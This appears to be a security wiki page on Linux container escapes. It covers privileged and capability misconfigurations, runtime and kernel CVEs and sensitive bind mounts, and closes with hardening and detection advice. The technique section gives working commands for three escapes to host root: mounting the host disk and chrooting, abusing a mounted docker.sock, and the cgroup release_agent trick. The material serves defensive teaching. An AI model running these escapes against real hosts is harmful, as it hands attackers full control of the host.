---
title: Container escape techniques
slug: container-escape-techniques
---

> **TL;DR:** Escapes fall into four buckets — over-permissive runtime config (privileged, host mounts, sockets), capability/userns abuse, runtime CVEs (runc, containerd), and host-kernel CVEs reachable from the guest.

## What it is
A container escape is any path from in-container code execution to host code execution (or host filesystem write). Containers are not a security boundary on their own — they're a packaging of namespaces, cgroups, seccomp, capabilities and a writable overlay. Removing or relaxing any of those layers brings escape into reach.

## Preconditions / where it applies
- Code execution inside a Linux container (Docker, containerd, Podman, Kubernetes pod)
- Some misconfiguration, granted capability, mounted resource, or unpatched runtime/kernel
- Useful diagnostics: `cat /proc/self/status | grep Cap`, `mount`, `ls -la /var/run/`, `cat /proc/1/cgroup`, `capsh --print`

## Technique

**1. `--privileged` or `CAP_SYS_ADMIN` + host PID/IPC.** Mount the host disk and chroot:
```bash
fdisk -l
mkdir /mnt/host && mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
```

**2. Mounted `docker.sock`.** A socket bind-mount at `/var/run/docker.sock` lets you talk to the host's Docker daemon:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host sh
```

**3. release_agent (cgroup v1).** Classic escape if you have `CAP_SYS_ADMIN` and the cgroup is rw:
```bash
mkdir /tmp/cg && mount -t cgroup -o rdma cgroup /tmp/cg
mkdir /tmp/cg/x && echo 1 > /tmp/cg/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cg/release_agent
printf '#!/bin/sh\nps>%s/out\n' "$host_path" > /cmd; chmod +x /cmd
sh -c "echo \$\$ > /tmp/cg/x/cgroup.procs"
```

**4. Runtime CVEs.** CVE-2019-5736 (runc, overwrite `/proc/self/exe`), CVE-2022-0185 (fsconfig heap overflow → host root), CVE-2024-21626 (runc fd leak via `WORKDIR`).

**5. Kernel exploits.** Dirty Pipe (CVE-2022-0847), Dirty COW (CVE-2016-5195), nf_tables UAF (CVE-2023-3390) — anything that doesn't require a syscall blocked by the default seccomp profile is fair game from inside a container.

**6. Sensitive bind mounts.** `/etc/shadow`, `/root/.ssh`, kubelet credentials at `/var/lib/kubelet`, or the host `/proc` mounted into the container all yield trivial wins.

## Detection and defence
- Run with `--cap-drop=ALL` and add back only what's needed; never `--privileged` in prod
- Enforce the default seccomp + AppArmor/SELinux profile; do not pass `--security-opt seccomp=unconfined`
- Use rootless Docker / userns-remap so in-container root is not host root
- Patch runc/containerd promptly; keep host kernel current
- Falco rules: `Unexpected outbound connection from container`, `Shell in container`, `Mount on sensitive FS`
- Kubernetes: PodSecurity admission `restricted` profile; no `hostPath`, `hostNetwork`, `hostPID`

## References
- [HackTricks — Docker breakout](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html) — exhaustive escape catalogue
- [NIST CVE-2024-21626](https://nvd.nist.gov/vuln/detail/CVE-2024-21626) — runc fd-leak escape details
- [Falco docs — container escape rules](https://falco.org/docs/) — runtime detection

Related: [[namespaces-and-cgroups]], [[user-namespace-attacks]], [[linux-capabilities]], [[kernel-exploits-linux]].
